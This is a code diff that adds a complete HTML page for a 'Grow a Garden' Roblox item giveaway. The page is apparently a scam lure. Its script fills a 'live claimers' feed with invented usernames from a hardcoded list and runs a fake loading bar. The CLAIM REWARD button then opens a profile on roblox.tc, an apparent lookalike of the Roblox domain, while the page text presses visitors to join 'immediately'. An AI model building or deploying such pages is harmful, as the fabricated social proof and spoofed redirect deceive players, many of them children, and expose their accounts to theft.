@@ -1,0 +1,771 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Garden Rewards - Gaming Giveaway</title>
+    <meta name="description" content="Claim your gaming rewards now! Join over 5K people in our giveaways for exclusive gaming items including Candy Blossom Seed, Kitsune, Dragon Fly, and Raccoon.">
+    <meta property="og:title" content="Garden Rewards - Gaming Giveaway">
+    <meta property="og:description" content="Claim exclusive gaming rewards and join thousands of gamers in our live giveaways!">
+    <meta property="og:type" content="website">
+    
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Rajdhani', sans-serif;
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #0f172a 100%);
+            color: white;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .font-orbitron {
+            font-family: 'Orbitron', monospace;
+        }
+
+        .font-rajdhani {
+            font-family: 'Rajdhani', sans-serif;
+        }
+
+        /* Background pattern */
+        .bg-pattern {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0.2;
+            background-image: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23059669' fill-opacity='0.03'%3E%3Ccircle cx='30' cy='30' r='2'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
+            background-repeat: repeat;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem 1rem;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* Neon glow effects */
+        .glow-text {
+            text-shadow: 0 0 10px currentColor, 0 0 20px currentColor, 0 0 30px currentColor;
+        }
+
+        .neon-border {
+            border: 2px solid;
+            border-image: linear-gradient(45deg, #10b981, #06b6d4, #ec4899, #eab308) 1;
+            animation: borderGlow 3s ease-in-out infinite alternate;
+        }
+
+        @keyframes borderGlow {
+            from {
+                box-shadow: 0 0 20px rgba(16, 185, 129, 0.3);
+            }
+            to {
+                box-shadow: 0 0 40px rgba(16, 185, 129, 0.6), 0 0 80px rgba(16, 185, 129, 0.3);
+            }
+        }
+
+        .animate-pulse-glow {
+            animation: pulseGlow 2s ease-in-out infinite alternate;
+        }
+
+        @keyframes pulseGlow {
+            from {
+                box-shadow: 0 0 20px rgba(16, 185, 129, 0.5);
+            }
+            to {
+                box-shadow: 0 0 40px rgba(16, 185, 129, 0.8), 0 0 80px rgba(16, 185, 129, 0.4);
+            }
+        }
+
+        /* Floating animation */
+        @keyframes float {
+            0%, 100% {
+                transform: translateY(0px);
+            }
+            50% {
+                transform: translateY(-10px);
+            }
+        }
+
+        .animate-float {
+            animation: float 3s ease-in-out infinite;
+        }
+
+        /* Hero section */
+        .hero {
+            text-align: center;
+            margin-bottom: 3rem;
+        }
+
+        .hero h1 {
+            font-size: 4rem;
+            font-weight: 900;
+            text-transform: uppercase;
+            margin-bottom: 2rem;
+            color: #10b981;
+            animation: float 3s ease-in-out infinite;
+        }
+
+        .hero-card {
+            background: rgba(30, 41, 59, 0.5);
+            backdrop-filter: blur(10px);
+            border-radius: 1rem;
+            padding: 2rem;
+            margin-bottom: 2rem;
+        }
+
+        .hero h2 {
+            font-size: 2rem;
+            font-weight: bold;
+            text-transform: uppercase;
+            margin-bottom: 1rem;
+            color: #06b6d4;
+        }
+
+        .hero h3 {
+            font-size: 1.5rem;
+            font-weight: bold;
+            text-transform: uppercase;
+            color: #eab308;
+        }
+
+        /* Main content grid */
+        .main-grid {
+            display: grid;
+            grid-template-columns: 1fr 350px;
+            gap: 2rem;
+        }
+
+        /* Rewards grid */
+        .rewards-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 1.5rem;
+            margin-bottom: 2rem;
+        }
+
+        .reward-card {
+            background: rgba(30, 41, 59, 0.8);
+            backdrop-filter: blur(10px);
+            border-radius: 1rem;
+            padding: 1.5rem;
+            border: 2px solid;
+            transition: all 0.3s ease;
+            cursor: pointer;
+        }
+
+        .reward-card:hover {
+            transform: translateY(-5px) scale(1.02);
+            animation: cardFloat 2s ease-in-out infinite;
+        }
+
+        @keyframes cardFloat {
+            0%, 100% {
+                transform: translateY(-5px) scale(1.02);
+            }
+            50% {
+                transform: translateY(-10px) scale(1.02);
+            }
+        }
+
+        .reward-card.neon-green {
+            border-color: #10b981;
+            color: #10b981;
+        }
+
+        .reward-card.neon-blue {
+            border-color: #06b6d4;
+            color: #06b6d4;
+        }
+
+        .reward-card.neon-pink {
+            border-color: #ec4899;
+            color: #ec4899;
+        }
+
+        .reward-card.neon-yellow {
+            border-color: #eab308;
+            color: #eab308;
+        }
+
+        .reward-card img {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+            border-radius: 0.5rem;
+            margin-bottom: 1rem;
+            transition: transform 0.3s ease;
+        }
+
+        .reward-card:hover img {
+            transform: scale(1.05);
+        }
+
+        .reward-card h3 {
+            font-size: 1.25rem;
+            font-weight: bold;
+            text-transform: uppercase;
+            text-align: center;
+        }
+
+        /* Claim section */
+        .claim-section {
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+
+        .claim-button {
+            background: linear-gradient(90deg, #10b981, #06b6d4);
+            color: black;
+            font-size: 1.5rem;
+            font-weight: 900;
+            text-transform: uppercase;
+            padding: 1rem 3rem;
+            border: none;
+            border-radius: 1rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-bottom: 1rem;
+        }
+
+        .claim-button:hover {
+            background: linear-gradient(90deg, #06b6d4, #ec4899);
+            transform: scale(1.05);
+        }
+
+        .claim-button:active {
+            transform: scale(0.95);
+        }
+
+        .claim-button:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        .claim-instruction {
+            font-size: 1.125rem;
+            color: #10b981;
+        }
+
+        /* Live claimers sidebar */
+        .live-sidebar {
+            background: rgba(30, 41, 59, 0.8);
+            backdrop-filter: blur(10px);
+            border-radius: 1rem;
+            padding: 1.5rem;
+            height: fit-content;
+        }
+
+        .live-sidebar h3 {
+            font-size: 1.25rem;
+            font-weight: bold;
+            text-transform: uppercase;
+            margin-bottom: 1.5rem;
+            color: #10b981;
+            text-align: center;
+        }
+
+        .live-feed {
+            max-height: 400px;
+            overflow-y: auto;
+        }
+
+        .live-feed::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        .live-feed::-webkit-scrollbar-track {
+            background: rgba(30, 41, 59, 0.5);
+            border-radius: 3px;
+        }
+
+        .live-feed::-webkit-scrollbar-thumb {
+            background: rgba(16, 185, 129, 0.5);
+            border-radius: 3px;
+        }
+
+        .live-feed::-webkit-scrollbar-thumb:hover {
+            background: rgba(16, 185, 129, 0.7);
+        }
+
+        .claim-item {
+            background: rgba(15, 23, 42, 0.5);
+            border-radius: 0.5rem;
+            padding: 1rem;
+            margin-bottom: 1rem;
+            border: 1px solid;
+            transition: all 0.3s ease;
+            animation: fadeInLeft 0.5s ease;
+        }
+
+        @keyframes fadeInLeft {
+            from {
+                opacity: 0;
+                transform: translateX(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        .claim-item.border-green {
+            border-color: rgba(16, 185, 129, 0.2);
+        }
+
+        .claim-item.border-blue {
+            border-color: rgba(6, 182, 212, 0.2);
+        }
+
+        .claim-item.border-pink {
+            border-color: rgba(236, 72, 153, 0.2);
+        }
+
+        .claim-item.border-yellow {
+            border-color: rgba(234, 179, 8, 0.2);
+        }
+
+        .claim-item:hover {
+            border-color: currentColor;
+        }
+
+        .user-info {
+            display: flex;
+            align-items: center;
+            margin-bottom: 0.5rem;
+        }
+
+        .user-avatar {
+            font-size: 1.5rem;
+            margin-right: 0.5rem;
+        }
+
+        .username {
+            font-weight: bold;
+        }
+
+        .username.green { color: #10b981; }
+        .username.blue { color: #06b6d4; }
+        .username.pink { color: #ec4899; }
+        .username.yellow { color: #eab308; }
+
+        .claim-action {
+            font-size: 0.875rem;
+            color: #d1d5db;
+            margin-bottom: 0.25rem;
+        }
+
+        .timestamp {
+            font-size: 0.75rem;
+            color: #10b981;
+        }
+
+        /* Loading section */
+        .loading-section {
+            text-align: center;
+            margin-top: 3rem;
+            display: none;
+        }
+
+        .loading-card {
+            background: rgba(30, 41, 59, 0.8);
+            backdrop-filter: blur(10px);
+            border-radius: 1rem;
+            padding: 2rem;
+            max-width: 600px;
+            margin: 0 auto;
+            animation: fadeInUp 0.5s ease;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(50px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .loading-text {
+            font-size: 1.125rem;
+            margin-bottom: 1rem;
+            color: #06b6d4;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 1rem;
+            background: rgba(75, 85, 99, 0.3);
+            border-radius: 0.5rem;
+            margin-bottom: 1rem;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #10b981, #06b6d4);
+            border-radius: 0.5rem;
+            transition: width 0.3s ease;
+            width: 1%;
+        }
+
+        .redirect-text {
+            font-size: 1.25rem;
+            font-weight: bold;
+            text-transform: uppercase;
+            color: #eab308;
+        }
+
+        /* Responsive design */
+        @media (max-width: 1024px) {
+            .main-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .hero h1 {
+                font-size: 2.5rem;
+            }
+
+            .hero h2 {
+                font-size: 1.5rem;
+            }
+
+            .hero h3 {
+                font-size: 1.25rem;
+            }
+
+            .rewards-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .container {
+                padding: 1rem;
+            }
+
+            .glow-text {
+                text-shadow: 0 0 5px currentColor, 0 0 10px currentColor;
+            }
+        }
+
+        /* Loading skeleton */
+        .skeleton {
+            background: linear-gradient(90deg, #374151 25%, #4b5563 50%, #374151 75%);
+            background-size: 200% 100%;
+            animation: skeleton-loading 1.5s infinite;
+        }
+
+        @keyframes skeleton-loading {
+            0% {
+                background-position: 200% 0;
+            }
+            100% {
+                background-position: -200% 0;
+            }
+        }
+
+        .skeleton-card {
+            background: rgba(30, 41, 59, 0.8);
+            border-radius: 1rem;
+            padding: 1.5rem;
+            border: 2px solid rgba(75, 85, 99, 0.3);
+        }
+
+        .skeleton-image {
+            width: 100%;
+            height: 200px;
+            border-radius: 0.5rem;
+            margin-bottom: 1rem;
+        }
+
+        .skeleton-text {
+            height: 1.5rem;
+            border-radius: 0.25rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-pattern"></div>
+    
+    <div class="container">
+        <!-- Hero Section -->
+        <div class="hero">
+            <h1 class="font-orbitron glow-text" id="hero-title">GROW A GARDEN</h1>
+            
+            <div class="hero-card neon-border">
+                <h2 class="font-rajdhani glow-text">
+                    CLAIM YOUR REWARDS NOW! ALMOST 5K PEOPLE ATTEND TO GIVEAWAYS!
+                </h2>
+                <h3 class="font-orbitron glow-text">
+                    JANDEL GIVEAWAY REWARDS!
+                </h3>
+            </div>
+        </div>
+        
+        <div class="main-grid">
+            <!-- Main Rewards Section -->
+            <div class="main-content">
+                <!-- Rewards Grid -->
+                <div class="rewards-grid" id="rewards-container">
+                    <!-- Loading skeletons -->
+                    <div class="skeleton-card">
+                        <div class="skeleton skeleton-image"></div>
+                        <div class="skeleton skeleton-text"></div>
+                    </div>
+                    <div class="skeleton-card">
+                        <div class="skeleton skeleton-image"></div>
+                        <div class="skeleton skeleton-text"></div>
+                    </div>
+                    <div class="skeleton-card">
+                        <div class="skeleton skeleton-image"></div>
+                        <div class="skeleton skeleton-text"></div>
+                    </div>
+                    <div class="skeleton-card">
+                        <div class="skeleton skeleton-image"></div>
+                        <div class="skeleton skeleton-text"></div>
+                    </div>
+                </div>
+                
+                <!-- Claim Section -->
+                <div class="claim-section">
+                    <button class="claim-button font-orbitron animate-pulse-glow" id="claim-btn" onclick="handleClaimReward()">
+                        CLAIM REWARD
+                    </button>
+                    <p class="claim-instruction font-rajdhani glow-text">
+                        PLEASE JOIN IMMEDIATELY IN THE SERVER PROVIDED TO GET YOUR REWARDS
+                    </p>
+                </div>
+            </div>
+            
+            <!-- Live Activity Sidebar -->
+            <div class="live-sidebar neon-border">
+                <h3 class="font-orbitron glow-text">LIVE CLAIMERS!</h3>
+                
+                <div class="live-feed" id="live-feed">
+                    <!-- Live claims will be populated here -->
+                </div>
+            </div>
+        </div>
+        
+        <!-- Loading Section -->
+        <div class="loading-section" id="loading-section">
+            <div class="loading-card neon-border">
+                <p class="loading-text font-rajdhani glow-text">
+                    Fetching to the server... <span class="font-bold" id="progress-text">1%</span>
+                </p>
+                
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progress-fill"></div>
+                </div>
+                
+                <p class="redirect-text font-orbitron glow-text">
+                    PLEASE WAIT REDIRECTING YOU TO THE SERVER...
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Sample data
+        const rewards = [
+            {
+                id: 1,
+                name: "CANDY BLOSSOM SEED",
+                image: "https://tr.rbxcdn.com/180DAY-6385d9e41716de59acae5f2cfc270b5e/420/420/ShoulderAccessory/Webp/noFilter",
+                color: "neon-green"
+            },
+            {
+                id: 2,
+                name: "KITSUNE",
+                image: "https://tr.rbxcdn.com/180DAY-179feb00ae2f1bd51a3e5504f6f5a975/420/420/BackAccessory/Webp/noFilter",
+                color: "neon-blue"
+            },
+            {
+                id: 3,
+                name: "DRAGON FLY",
+                image: "https://tr.rbxcdn.com/180DAY-1e19bc7e19df613bf2b707600daa8ff0/420/420/ShirtAccessory/Webp/noFilter",
+                color: "neon-pink"
+            },
+            {
+                id: 4,
+                name: "RACCOON",
+                image: "https://tr.rbxcdn.com/180DAY-68d9b72afd74d418867d5d2f8d34e0b8/420/420/Hat/Webp/noFilter",
+                color: "neon-yellow"
+            }
+        ];
+
+        let liveClaims = [
+            { id: 1, username: "SlayerSupremeTyt", rewardName: "DRAGON FLY", timestamp: new Date() },
+            { id: 2, username: "ProGamer69420", rewardName: "KITSUNE", timestamp: new Date() },
+            { id: 3, username: "xJandelYT", rewardName: "DRAGON FLY", timestamp: new Date() }
+        ];
+
+        const userAvatars = ["👤", "🎮", "⚡", "🔥", "💎", "🚀", "⭐", "🎯", "🏆", "💫"];
+        const mockUsers = [
+            'GamerXtreme42', 'NeonNinja23', 'CyberSamurai78', 'PixelWarrior65', 'DragonHunter198',
+            'ShadowBlade7', 'NeonKnightss', 'StarDestroyerxx', 'PhantomGamer66', 'elitehunterss', 'Cordero56','Adoboo36','Delacruxx67'
+        ];
+
+        let isRedirecting = false;
+        let loadingProgress = 1;
+
+        // Initialize the page
+        function init() {
+            loadRewards();
+            updateLiveFeed();
+            
+            // Start generating new claims every 8 seconds
+            setInterval(generateNewClaim, 8000);
+        }
+
+        // Load rewards
+        function loadRewards() {
+            const container = document.getElementById('rewards-container');
+            container.innerHTML = '';
+            
+            rewards.forEach((reward, index) => {
+                const card = document.createElement('div');
+                card.className = `reward-card ${reward.color}`;
+                card.style.animationDelay = `${index * 0.1}s`;
+                
+                card.innerHTML = `
+                    <img src="${reward.image}" alt="${reward.name}" loading="lazy">
+                    <h3 class="font-orbitron glow-text">${reward.name}</h3>
+                `;
+                
+                container.appendChild(card);
+            });
+        }
+
+        // Update live feed
+        function updateLiveFeed() {
+            const feed = document.getElementById('live-feed');
+            feed.innerHTML = '';
+            
+            // Sort by newest first and limit to 10
+            const sortedClaims = [...liveClaims]
+                .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
+                .slice(0, 10);
+            
+            sortedClaims.forEach((claim, index) => {
+                const item = document.createElement('div');
+                const borderColor = ['border-green', 'border-blue', 'border-pink', 'border-yellow'][index % 4];
+                const textColor = ['green', 'blue', 'pink', 'yellow'][index % 4];
+                
+                item.className = `claim-item ${borderColor}`;
+                item.style.animationDelay = `${index * 0.1}s`;
+                
+                item.innerHTML = `
+                    <div class="user-info">
+                        <span class="user-avatar">${userAvatars[index % userAvatars.length]}</span>
+                        <span class="username ${textColor} font-rajdhani">${claim.username}</span>
+                    </div>
+                    <p class="claim-action">claimed ${claim.rewardName}</p>
+                    <p class="timestamp">${formatTimestamp(claim.timestamp)}</p>
+                `;
+                
+                feed.appendChild(item);
+            });
+        }
+
+        // Generate new claim
+        function generateNewClaim() {
+            const randomUser = mockUsers[Math.floor(Math.random() * mockUsers.length)];
+            const randomReward = rewards[Math.floor(Math.random() * rewards.length)];
+            
+            const newClaim = {
+                id: Date.now(),
+                username: randomUser,
+                rewardName: randomReward.name,
+                timestamp: new Date()
+            };
+            
+            liveClaims.unshift(newClaim);
+            updateLiveFeed();
+        }
+
+        // Format timestamp
+        function formatTimestamp(timestamp) {
+            return new Date(timestamp).toLocaleTimeString('en-US', {
+                hour: 'numeric',
+                minute: '2-digit',
+                second: '2-digit',
+                hour12: true
+            });
+        }
+
+        // Handle claim reward
+        function handleClaimReward() {
+            if (isRedirecting) return;
+            
+            isRedirecting = true;
+            const claimBtn = document.getElementById('claim-btn');
+            const loadingSection = document.getElementById('loading-section');
+            
+            claimBtn.textContent = 'REDIRECTING...';
+            claimBtn.disabled = true;
+            loadingSection.style.display = 'block';
+            
+            // Simulate loading progress
+            const progressInterval = setInterval(() => {
+                loadingProgress += Math.random() * 3;
+                
+                if (loadingProgress >= 85) {
+                    loadingProgress = 85;
+                    clearInterval(progressInterval);
+                }
+                
+                document.getElementById('progress-text').textContent = Math.floor(loadingProgress) + '%';
+                document.getElementById('progress-fill').style.width = loadingProgress + '%';
+            }, 200);
+            
+            // Simulate redirect after 3 seconds
+            setTimeout(() => {
+                window.open(' https://www.roblox.tc/users/4732853489/profile', '_blank');
+                
+                // Reset after redirect
+                setTimeout(() => {
+                    isRedirecting = false;
+                    loadingProgress = 1;
+                    claimBtn.textContent = 'CLAIM REWARD';
+                    claimBtn.disabled = false;
+                    loadingSection.style.display = 'none';
+                    document.getElementById('progress-text').textContent = '1%';
+                    document.getElementById('progress-fill').style.width = '1%';
+                }, 2000);
+            }, 3000);
+        }
+
+        // Add some visual effects
+        function addVisualEffects() {
+            // Floating animation for hero title
+            const heroTitle = document.getElementById('hero-title');
+            setInterval(() => {
+                heroTitle.style.transform = `translateY(${Math.sin(Date.now() * 0.001) * 10}px)`;
+            }, 16);
+        }
+
+        // Initialize everything when page loads
+        document.addEventListener('DOMContentLoaded', () => {
+            init();
+            addVisualEffects();
+        });
+    </script>
+</body>
+</html>
